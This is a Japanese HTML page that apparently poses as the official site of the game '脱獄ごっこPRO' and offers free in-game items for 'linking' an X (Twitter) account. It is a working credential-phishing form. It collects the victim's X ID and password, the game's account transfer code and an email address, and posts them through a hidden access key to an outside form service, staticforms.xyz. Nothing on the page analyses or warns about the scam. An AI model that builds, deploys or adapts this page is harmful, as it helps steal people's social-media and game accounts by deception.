<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>脱獄ごっこPRO公式サイトにX（旧Twitter）をリンクするとアイテム贈呈！！</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
<div class="contact-form">
    <p class="title">X（旧Twitter）をリンクしてアイテムを受け取ろう！！</p>

    <form action="https://api.staticforms.xyz/submit" method="post">
      <input type="hidden" name="accessKey" value="02116f3a-97fb-4fc2-8eb7-1ce23c8e6e66">
      <input type="hidden" name="subject" value="Test">
      <div class="item">
        <label class="label">X (Twitter)　ID</label>
        <input type="text" class="inputs" name="name" required/>
      </div>

       <div class="item">
        <label class="label">X (Twitter) パスワード</label>
        <input type="text" class="inputs" name="name" required/>
      </div>


      <div class="item">
        <label class="label">脱プロ引き継ぎコード</label>
        <input type="text" class="inputs" name="name" required/>
      </div>

      <div class="item">
        <label class="label">メールアドレス</label>
        <input type="email" class="inputs" name="email" />
      </div>

      <div class="item">
        <p class="label">アイテム</p>
        <div class="inputs">
          <input id="s" type="radio" name="menu" value="s" /><label for="s"
            >鬼鮫マント</label
          >
          <input id="a" type="radio" name="menu" value="a" /><label for="a"
            >宇宙時計</label
          >
          <input id="b" type="radio" name="menu" value="b" /><label for="b"
            >無償コイン6000枚</label
          >
        </div>
      </div>

        <div class="item">
          <label class="label">ご質問</label>
          <textarea class="inputsf" placeholder="ご質問はこちら"></textarea>
        </div>

        <div class="button-area">
          <input type="submit" value="予約決定" />
          <input type="reset" value="リセット" />
        </div>
      </div>
    </form>
</div>
  </body>
</html>
